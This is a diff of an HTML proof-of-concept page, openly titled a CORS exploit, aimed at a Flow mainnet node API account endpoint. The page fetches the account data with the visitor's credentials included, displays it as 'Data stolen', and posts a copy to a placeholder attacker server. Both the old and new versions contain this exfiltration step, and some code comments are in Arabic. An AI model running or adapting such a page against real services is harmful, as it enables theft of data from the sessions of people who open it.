@@ -1,29 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Flow CORS Exploit (XHR)</title>
+  <title>CORS Exploit PoC</title>
 </head>
-<body>
-  <h2>Flow CORS Misconfiguration PoC</h2>
+<body style="background:#111;color:#0f0;font-family:monospace;">
+  <h2>CORS Misconfiguration Exploit</h2>
+  <p>Stealing Flow account data...</p>
   <pre id="output">Loading...</pre>
 
   <script>
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://access.mainnet.nodes.onflow.org/v1/accounts/0x1654653399040a61", true);
-    xhr.withCredentials = true;
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4) {
-        document.getElementById("output").textContent = xhr.responseText;
+    // API الهدف المتأثر
+    const target = "https://access.mainnet.nodes.onflow.org/v1/accounts/0x1654653399040a61";
 
-        // Exfiltrate to attacker server
-        fetch("https://attacker.com/log", {
-          method: "POST",
-          body: xhr.responseText,
-          headers: { "Content-Type": "application/json" }
-        });
-      }
-    };
-    xhr.send();
+    // سيرفر المهاجم لتجميع البيانات
+    const attackerServer = "https://attacker.com/collect";
+
+    fetch(target, {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(res => res.json())
+    .then(data => {
+      // عرض الداتا في واجهة PoC
+      document.getElementById("output").textContent =
+        "✅ Data stolen:\n\n" + JSON.stringify(data, null, 2);
+
+      // إرسال نسخة لسيرفر المهاجم
+      fetch(attackerServer, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(data)
+      });
+    })
+    .catch(err => {
+      document.getElementById("output").textContent =
+        "❌ Exploit failed: " + err;
+    });
   </script>
 </body>
 </html>
